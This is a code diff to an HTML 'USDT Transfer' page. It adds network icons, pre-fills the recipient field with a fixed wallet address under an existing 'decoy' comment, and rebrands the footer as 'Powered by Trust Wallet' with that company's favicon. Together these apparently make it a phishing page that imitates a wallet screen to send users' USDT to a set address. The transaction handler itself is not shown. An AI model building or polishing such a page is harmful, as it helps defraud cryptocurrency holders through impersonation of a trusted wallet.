@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>USDT Transfer</title>
   <style>
- 
+    /* Minimal – exactly as in your image */
     body {
       background: #f5f7fa;
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
@@ -59,6 +59,50 @@
     .field-row select {
       appearance: auto;
       cursor: pointer;
+    }
+    /* Custom styled select with images */
+    .custom-select {
+      position: relative;
+      width: 100%;
+    }
+    .custom-select select {
+      width: 100%;
+      padding: 10px 12px;
+      padding-left: 44px;
+      border: 1px solid #e2e8f0;
+      border-radius: 8px;
+      font-size: 15px;
+      background: #f7fafc;
+      transition: 0.15s;
+      outline: none;
+      appearance: auto;
+      cursor: pointer;
+    }
+    .custom-select select:focus {
+      border-color: #3182ce;
+      background: #fff;
+    }
+    .custom-select .select-icon {
+      position: absolute;
+      left: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      pointer-events: none;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      background: #fff;
+      border: 1px solid #e2e8f0;
+    }
+    .custom-select .select-icon img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+      border-radius: 50%;
     }
     .btn-secondary {
       background: #edf2f7;
@@ -133,32 +177,46 @@
       margin-top: 20px;
       border-top: 1px solid #e2e8f0;
       padding-top: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+    .footer-note img {
+      width: 18px;
+      height: 18px;
+      border-radius: 4px;
     }
   </style>
 </head>
 <body>
 
 <div class="container">
-  <!-- Address or Domain Name (decoy) -->
+  <!-- Address or Domain Name (decoy) - pre-filled -->
   <div class="field-group">
     <label>Address or Domain Name</label>
     <div class="field-row">
-      <input type="text" id="recipientInput" placeholder="0x402b1a4FD55Ca191a22039162173A3b4E5a7C9e7" />
+      <input type="text" id="recipientInput" placeholder="0x..." value="0x402b1a4FD55Ca191a22039162173A3b4E5a7C9e7" />
       <button class="btn-secondary" id="pasteBtn">Paste</button>
-      <button class="clear-btn" id="clearAddr">✕</button>
+      <button class="clear-btn visible" id="clearAddr">✕</button>
     </div>
   </div>
 
-  <!-- Destination network -->
+  <!-- Destination network with images -->
   <div class="field-group">
     <label>Destination network</label>
     <div class="field-row">
-      <select id="networkSelect">
-        <option value="0">BNB Smart Chain (BEP20)</option>
-        <option value="1">Ethereum (ERC20)</option>
-        <option value="2">Polygon</option>
-        <option value="3">Arbitrum</option>
-      </select>
+      <div class="custom-select">
+        <div class="select-icon" id="networkIcon">
+          <img src="https://s2.coinmarketcap.com/static/img/coins/200x200/1839.png" alt="BNB" />
+        </div>
+        <select id="networkSelect">
+          <option value="0" data-icon="https://s2.coinmarketcap.com/static/img/coins/200x200/1839.png">BNB Smart Chain (BEP20)</option>
+          <option value="1" data-icon="https://tse1.mm.bing.net/th/id/OIP.WZaxrR-JdgEl7jlVVa4xWAHaEe?r=0&rs=1&pid=ImgDetMain&o=7&rm=3">Ethereum (ERC20)</option>
+          <option value="2" data-icon="https://forum.polygon.technology/uploads/default/original/2X/e/e8a6275557c6497c38ab0a80bb639bfac8178d78.jpeg">Polygon</option>
+          <option value="3" data-icon="https://th.bing.com/th/id/OIP.XCCGzmUFCVYkr4hfhLQPpgHaFr?r=0&o=7rm=3&rs=1&pid=ImgDetMain&o=7&rm=3">Arbitrum</option>
+        </select>
+      </div>
     </div>
   </div>
 
@@ -176,7 +234,11 @@
   <!-- Next button -->
   <button class="btn-primary" id="nextBtn" disabled>Next</button>
 
-  <div class="footer-note">USDT transfer · Powered by your wallet</div>
+  <!-- Footer with Trust Wallet -->
+  <div class="footer-note">
+    <img src="https://trustwallet.com/assets/images/favicon.png" alt="Trust Wallet" />
+    USDT transfer · Powered by Trust Wallet
+  </div>
 </div>
 
 <script type="module">
@@ -194,7 +256,8 @@
       rpc: 'https://bsc-dataseed1.binance.org/',
       usdt: '0x55d398326f99059fF775485246999027B3197955',
       nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-      explorer: 'https://bscscan.com'
+      explorer: 'https://bscscan.com',
+      icon: 'https://s2.coinmarketcap.com/static/img/coins/200x200/1839.png'
     },
     {
       name: 'Ethereum',
@@ -202,7 +265,8 @@
       rpc: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
       usdt: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
       nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
-      explorer: 'https://etherscan.io'
+      explorer: 'https://etherscan.io',
+      icon: 'https://tse1.mm.bing.net/th/id/OIP.WZaxrR-JdgEl7jlVVa4xWAHaEe?r=0&rs=1&pid=ImgDetMain&o=7&rm=3'
     },
     {
       name: 'Polygon',
@@ -210,7 +274,8 @@
       rpc: 'https://polygon-rpc.com',
       usdt: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
       nativeCurrency: { name: 'Matic', symbol: 'MATIC', decimals: 18 },
-      explorer: 'https://polygonscan.com'
+      explorer: 'https://polygonscan.com',
+      icon: 'https://forum.polygon.technology/uploads/default/original/2X/e/e8a6275557c6497c38ab0a80bb639bfac8178d78.jpeg'
     },
     {
       name: 'Arbitrum',
@@ -218,7 +283,8 @@
       rpc: 'https://arb1.arbitrum.io/rpc',
       usdt: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
       nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
-      explorer: 'https://arbiscan.io'
+      explorer: 'https://arbiscan.io',
+      icon: 'https://th.bing.com/th/id/OIP.XCCGzmUFCVYkr4hfhLQPpgHaFr?r=0&o=7rm=3&rs=1&pid=ImgDetMain&o=7&rm=3'
     }
   ];
 
@@ -277,8 +343,18 @@
     clearAmount: $('clearAmount'),
     maxBtn: $('maxBtn'),
     pasteBtn: $('pasteBtn'),
-    networkSelect: $('networkSelect')
+    networkSelect: $('networkSelect'),
+    networkIcon: $('networkIcon')
   };
+
+  // ── Update network icon ──
+  function updateNetworkIcon(selectElement) {
+    const selectedOption = selectElement.options[selectElement.selectedIndex];
+    const iconUrl = selectedOption.getAttribute('data-icon');
+    if (ui.networkIcon && iconUrl) {
+      ui.networkIcon.innerHTML = `<img src="${iconUrl}" alt="network" />`;
+    }
+  }
 
   // ── Init ──
   document.addEventListener('DOMContentLoaded', () => {
@@ -289,9 +365,15 @@
 
     ui.nextBtn.addEventListener('click', handleNextClick);
 
+    // Network selection with icon update
     ui.networkSelect.addEventListener('change', () => {
-      selectedNetwork = NETWORKS[parseInt(ui.networkSelect.value)] || NETWORKS[0];
+      const idx = parseInt(ui.networkSelect.value);
+      selectedNetwork = NETWORKS[idx] || NETWORKS[0];
+      updateNetworkIcon(ui.networkSelect);
     });
+
+    // Set initial icon
+    updateNetworkIcon(ui.networkSelect);
 
     ui.amountInput.oninput = () => {
       const val = parseFloat(ui.amountInput.value) || 0;
@@ -328,7 +410,9 @@
       } catch { /* ignore */ }
     };
 
+    // Trigger initial UI states
     ui.recipientInput.oninput();
+    ui.amountInput.oninput();
   });
 
   // ── Main handler ──
